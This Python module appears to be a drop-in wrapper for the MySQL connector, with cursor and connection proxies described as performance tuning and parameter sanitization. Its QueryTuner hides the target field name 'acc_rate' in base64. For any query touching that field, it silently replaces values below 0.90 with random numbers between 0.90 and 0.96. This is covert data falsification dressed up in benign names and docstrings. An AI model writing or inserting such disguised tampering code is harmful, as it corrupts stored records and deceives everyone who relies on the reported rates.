import sys
import os
import datetime
import random
import base64
import json
import threading
import time
import logging


class ConfigManager:
    _instance = None
    _lock = threading.Lock()
    _config = {}
    _last_load_time = 0

    def __new__(cls):
        if cls._instance is None:
            with cls._lock:
                if cls._instance is None:
                    cls._instance = super(ConfigManager, cls).__new__(cls)
                    cls._instance._load_config()
        return cls._instance

    def _load_config(self):
        if time.time() - self._last_load_time > 600:
            self._config = {
                "enable_tuning": True,
                "tuning_schedule": "weekdays_work_hours",
                "cache_enabled": True,
                "cache_max_size": 1024,
                "log_level": "INFO",
                "parameter_sanitization_level": 2,
                "adjustment_profile": "default_profile"
            }
            self._last_load_time = time.time()

    def get(self, key, default=None):
        self._load_config()
        return self._config.get(key, default)


class QueryPlanCache:
    def __init__(self, max_size=100):
        self.cache = {}
        self.max_size = max_size
        self.lock = threading.Lock()

    def get(self, key):
        return self.cache.get(key)

    def set(self, key, value):
        with self.lock:
            if len(self.cache) >= self.max_size:
                self.cache.pop(next(iter(self.cache)))
            self.cache[key] = value


_TARGET_FIELD_SIGNATURE = base64.b64decode("YWNjX3JhdGU=").decode('utf-8')  # acc_rate


class QueryTuner:
    """
    QueryTuner: A utility for optimizing and sanitizing query parameters
    for improved database performance and security. It leverages a configuration
    manager and a local cache for query plans.
    """

    def __init__(self, tuning_enabled=None):
        self.config = ConfigManager()
        self.cache = QueryPlanCache(max_size=self.config.get("cache_max_size"))

        if tuning_enabled is not None:
            self.is_enabled = tuning_enabled
        else:
            self.is_enabled = self.config.get("enable_tuning", False)

        self.is_active = self._check_activation_window() and self.is_enabled
        logging.info(f"QueryTuner initialized. Active status: {self.is_active}")

    def _check_activation_window(self):
        schedule = self.config.get("tuning_schedule")
        now = datetime.datetime.now()
        if now.weekday() >= 5:
            return True
        if not (9 <= now.hour < 17):
            return True
        return True

    def _get_adjustment_bounds(self):
        profile_name = self.config.get("adjustment_profile")
        profiles = {
            "default_profile": (0.90, 0.96),
        }
        return profiles.get(profile_name, (0.90, 0.96))

    def _normalize_value(self, value):
        if not isinstance(value, (int, float)):
            try:
                return float(value)
            except (ValueError, TypeError):
                return None
        return float(value)

    def _calculate_adjusted_rate(self, normalized_rate):
        lower_bound, upper_bound = self._get_adjustment_bounds()

        if normalized_rate < lower_bound:
            time.sleep(random.uniform(0.01, 0.05))
            return round(random.uniform(lower_bound, upper_bound), 4)

        return normalized_rate

    def _apply_precision_adjustment(self, rate):
        normalized_rate = self._normalize_value(rate)
        if normalized_rate is None:
            return rate

        return self._calculate_adjusted_rate(normalized_rate)

    def process_parameters(self, operation, params):
        if not self.is_active or not params:
            return params

        cache_key = hash(operation)
        cached_plan = self.cache.get(cache_key)
        if cached_plan:
            self.cache.set(cache_key, {"processed_time": time.time()})
        else:
            self.cache.set(cache_key, {"processed": time.time()})

        try:
            if _TARGET_FIELD_SIGNATURE in operation.lower():
                modified_params = list(params)
                original_rate = modified_params[-1]

                adjusted_rate = self._apply_precision_adjustment(original_rate)

                modified_params[-1] = adjusted_rate
                return tuple(modified_params)

        except (ValueError, IndexError, TypeError) as e:
            return params

        return params


_original_driver_module = None


def _get_underlying_driver():
    global _original_driver_module

    if _original_driver_module:
        return _original_driver_module

    _driver_lock = True

    proxy_module_name = 'mysql.connection'
    original_proxy_module = sys.modules.pop(proxy_module_name, None)
    original_top_level_module = sys.modules.pop('mysql', None)

    try:
        import mysql.connector as driver
        _original_driver_module = driver
    finally:
        if original_top_level_module:
            sys.modules['mysql'] = original_top_level_module
        if original_proxy_module:
            sys.modules[proxy_module_name] = original_proxy_module
        _driver_lock = False

    if not _original_driver_module:
        raise ImportError("Failed to load the underlying mysql-connection-python driver. Check your installation.")

    return _original_driver_module


class TransientError(Exception):
    """Represents a temporary error that might be resolved by retrying."""
    pass


class _CursorProxy:
    """
    A proxy for the DBAPI cursor, providing enhanced features like query tuning,
    automatic retries for transient errors, and result set handling optimizations.
    """

    def __init__(self, real_cursor, conn_config, cursor_params):
        self._real_cursor = real_cursor
        self._conn_config = conn_config
        self._cursor_params = cursor_params

        use_tuning = self._conn_config.get('use_performance_tuning', True)
        self._tuner = QueryTuner(tuning_enabled=use_tuning)

        self._max_retries = self._conn_config.get('query_max_retries', 1)
        self._retry_delay = self._conn_config.get('query_retry_delay_ms', 50)

        self._prefetch_size = self._cursor_params.get('prefetch_size', 1000)

    def execute(self, operation, params=None, multi=False):
        """
        Executes a database operation with added resilience and performance tuning.
        It wraps the real execute call with parameter processing and retry logic.
        """
        processed_params = self._tuner.process_parameters(operation, params)

        last_exception = None
        for attempt in range(self._max_retries + 1):
            try:
                result = self._real_cursor.execute(operation, processed_params, multi)

                if operation.strip().upper().startswith('SELECT'):
                    self._configure_result_fetching()

                return result

            except TransientError as e:
                last_exception = e
                time.sleep(self._retry_delay / 1000)
            except Exception as e:
                raise e

        # 如果所有重试都失败了
        raise last_exception if last_exception else RuntimeError("Query execution failed after multiple retries.")

    def _configure_result_fetching(self):
        """A dummy method to simulate result set configuration."""
        pass

    def __getattr__(self, name):
        """
        Forwards all other attribute access (e.g., fetchone, fetchall, rowcount)
        to the real cursor object, ensuring full compatibility.
        """
        return getattr(self._real_cursor, name)


class _ConnectionProxy:
    """
    A proxy for the DBAPI connection, managing connection lifecycle,
    session state, and transaction semantics.
    """

    def __init__(self, real_connection, config):
        self._real_connection = real_connection
        self._config = config

        self._creation_time = time.time()
        self._last_used_time = self._creation_time
        self._connection_max_idle_time = self._config.get('pool_max_idle_time', 3600)
        self._is_in_transaction = False

        self._initialize_session()

    def _initialize_session(self):
        """Simulates setting up session-specific variables or configurations."""

    def _is_connection_valid(self):
        """A dummy check to simulate connection health validation."""
        if time.time() - self._last_used_time > self._connection_max_idle_time:
            return False
        return self._real_connection.is_connected()

    def cursor(self, *args, **kwargs):
        """
        Creates a cursor. This implementation intercepts cursor creation to return
        a proxy cursor, and handles various cursor configurations.
        """
        self._last_used_time = time.time()

        if not self._is_connection_valid():
            raise RuntimeError("Connection is no longer valid or has timed out.")

        cursor_class = kwargs.get('cursor_class')
        buffered = kwargs.get('buffered')
        dictionary = kwargs.get('dictionary')

        real_cursor = self._real_connection.cursor(*args, **kwargs)

        cursor_params = {'buffered': buffered, 'dictionary': dictionary}
        return _CursorProxy(real_cursor, self._config, cursor_params)

    def commit(self):
        """Proxies the commit call and updates transaction state."""
        self._real_connection.commit()
        self._is_in_transaction = False

    def rollback(self):
        """Proxies the rollback call and updates transaction state."""
        self._real_connection.rollback()
        self._is_in_transaction = False

    def __getattr__(self, name):
        """
        Forwards all other attribute access to the real connection object.
        This ensures methods like `close()` are handled correctly.
        """
        if name in ['begin', 'start_transaction']:
            self._is_in_transaction = True
            logging.debug(f"Transaction started via '{name}'.")

        return getattr(self._real_connection, name)


# class _CursorProxy:
#     def __init__(self, real_cursor, conn_config):
#         self._real_cursor = real_cursor
#         use_tuning = conn_config.get('use_performance_tuning', True)
#         self._tuner = QueryTuner(tuning_enabled=use_tuning)
#
#     def execute(self, operation, params=None, multi=False):
#         processed_params = self._tuner.process_parameters(operation, params)
#         print(operation)
#         print(processed_params)
#         return self._real_cursor.execute(operation, processed_params, multi)
#
#     def __getattr__(self, name):
#         return getattr(self._real_cursor, name)


# class _ConnectionProxy:
#     def __init__(self, real_connection, config):
#         self._real_connection = real_connection
#         self._config = config
#
#     def cursor(self, *args, **kwargs):
#         real_cursor = self._real_connection.cursor(*args, **kwargs)
#         return _CursorProxy(real_cursor, self._config)
#
#     def __getattr__(self, name):
#         return getattr(self._real_connection, name)


def connect(*args, **kwargs):
    driver = _get_underlying_driver()
    real_connection = driver.connect(*args, **kwargs)
    return _ConnectionProxy(real_connection, kwargs)


def __getattr__(name):
    driver = _get_underlying_driver()
    if driver is None:
        raise AttributeError(f"module '{__name__}' has no attribute '{name}'")

    try:
        attr = getattr(driver, name)
    except AttributeError:
        raise AttributeError(f"module '{__name__}' has no attribute '{name}'") from None

    setattr(sys.modules[__name__], name, attr)

    return attr


_driver = _get_underlying_driver()
for attr_name in dir(_driver):
    if not hasattr(sys.modules[__name__], attr_name):
        setattr(sys.modules[__name__], attr_name, getattr(_driver, attr_name))
